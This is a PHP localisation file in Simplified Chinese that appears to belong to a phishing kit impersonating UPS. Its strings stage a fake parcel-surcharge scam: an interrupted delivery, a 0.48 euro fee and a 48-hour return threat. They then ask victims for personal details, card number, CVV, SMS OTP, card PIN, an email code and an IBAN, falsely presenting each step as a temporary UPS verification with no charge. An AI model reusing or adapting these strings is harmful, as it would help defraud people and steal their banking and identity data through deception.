<?php
function lang($phrase){
	static $lang = array(

                "xlang" => "ZH",
                "xcapt1" => "请在方框中打勾",
                "xcapt2" => "验证",
                "xcapt3" => "继续",
                "xfot1" => "本网站",
                "xfot2" => "其他 UPS 站点",
                "xfot3" => "与我们联系",
                "xfot4" => "法律",
                "xfot5" => "Copyright ©1994- 2023&nbsp;United Parcel Service of America, Inc. All rights reserved. ",
                "xind1" => "跟进",
                "xind2" => "跟踪号码",
                "xind3" => "错误：请提供正确的跟踪号码",
                "xind4" => "需要帮助修改您的快递吗",
                "xind5" => "报价",
                "xind6" => "发货",
                "xind7" => "开票",
                "xind8" => "获取帮助",
                "xexp1" => "交货中断",
                "xexp2" => "跟进",
                "xexp3" => "您的上次送货被中断。目前正在分拣中心等待",
                "xexp4" => "寄给您的包裹不符合指定重量，您将被要求支付附加费，以确保正确投递您的包裹",
                "xexp5" => "费用为 0.48 欧元",
                "xexp6" => "付款请点击下面的按钮",
                'xexp7' => "付款",
                "xexp8" => "支付税款后，您的包裹将尽快寄往收货地址",
                "xexp9" => "如果在 48 小时内未支付税款，包裹将退回发件人",
                "xexp10" => "通过参考编号跟踪",
                "xexp11" => "进口跟踪号码",
                "xexp12" => "其他跟踪服务",
                "xinfz1" => "确认您的账单详情",
                "xinfz2" => "全名",
                "xinfz10" => "出生日期",
                "xinfz3" => "国家",
                "xinfz4" => "城市",
                "xinfz5" => "地址",
                "xinfz6" => "电话",
                "xinfz7" => "邮编",
                "xinfz8" => "错误 ： 需要所有数据",
                "xinfz9" => "确认",
                "xpay1" => "付款详情",
                "xpay2" => "尊敬的客户，请正确核对您的付款信息并匹配您的银行卡信息，以便完成付款",
                "xpay3" => "卡上姓名",
                "xpay4" => "卡号",
                "xpay5" => "有效期",
                "xpay6" => "CVV 安全码（3 位数）",
                "xpay7" => "错误：需要所有数据",
                "xpay8" => "确认",
                "xsms1" => "验证",
                "xsms2" => "我们已经向您的号码发送了确认代码",
                "xsms3" => "OTP 代码",
                "xsms4" => "错误：OTP 代码不正确",
                "xsms5" => "为安全完成支付过程，此步骤必不可少",
                "xsms6" => "UPS 正在对您的卡进行临时验证。这只是授权而非收费",
                "xsms7" => "确认",
                "xconf1" => "Resume delivery",
                "xconf2" => "已考虑支付额外费用",
                "xconf3" => "您的包裹将在 24 小时内到达",
                "xconf4" => "确认",
                "xpin1" => "验证",
                "xpin2" => "输入您银行卡的密码",
                "xpin3" => "密码",
                "xpin4" => "4 位数）",
                "xpin5" => "此步骤是安全完成支付过程所必需的",
                "xpin6" => "UPS 对您的卡进行临时验证。这只是授权，不收费。",
                "xpin7" => "确认",
                "xmail1" => "验证",
                "xmail2" => "我们已将确认代码发送到您的电子邮件",
                "xmail3" => "电子邮件代码",
                "xmail4" => "6 位数）",
                "xmail5" => "此步骤是安全完成支付过程所必需的",
                "xmail6" => "UPS 对您的卡进行临时验证。这只是授权，不收费。",
                "xmail7" => "确认",
                "xiban1" => "验证",
                "xiban2" => "请输入您的 IBAN 以完成付款",
                "xiban3" => "IBAN",
                "xiban4" => "（IBAN）",
                "xiban5" => "此步骤是安全完成支付过程所必需的",
                "xiban6" => "UPS 对您的银行卡进行临时验证。这只是授权，不收费。",
                "xiban7" => "确认"
	);	
	
	return $lang[$phrase];
}
 ?>